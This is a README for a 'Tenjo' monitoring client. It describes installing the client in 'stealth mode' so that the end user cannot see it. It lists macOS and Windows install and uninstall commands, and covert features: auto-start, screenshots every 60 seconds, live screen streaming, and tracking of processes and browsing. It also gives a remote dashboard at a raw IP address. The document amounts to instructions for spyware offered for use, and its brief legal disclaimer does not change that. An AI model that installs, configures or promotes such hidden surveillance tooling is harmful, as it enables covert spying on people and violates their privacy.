# Tenjo Monitoring Client - Installation Instructions

## 🔒 Stealth Installation

This package installs the Tenjo monitoring client in stealth mode, making it invisible to the end user.

### macOS Installation
```bash
chmod +x stealth_install_macos.sh
./stealth_install_macos.sh
```

### Windows Installation
```cmd
stealth_install_windows.bat
```

## ⚙️ Configuration

Before installation, edit the installer script to set your server URL:
- Change `SERVER_URL` to your actual server address
- Update `API_KEY` if needed

## 🚀 Features

- **Stealth Mode**: Hidden installation and operation
- **Auto-Start**: Automatically starts on system boot
- **Screen Monitoring**: Captures screenshots every 60 seconds
- **Live Streaming**: Real-time screen streaming capability
- **Process Monitoring**: Tracks running applications
- **Browser Monitoring**: Monitors web browsing activity

## 📱 Remote Management

Access the dashboard at: `http://103.129.149.67`

View live streaming at: `http://103.129.149.67/client/{client-id}/live`

## 🗑️ Uninstallation

### macOS
```bash
./stealth_uninstall_macos.sh
```

### Windows
```cmd
stealth_uninstall_windows.bat
```

## ⚠️ Legal Notice

This software is intended for legitimate monitoring purposes only. Ensure you have proper authorization before installing on any system.
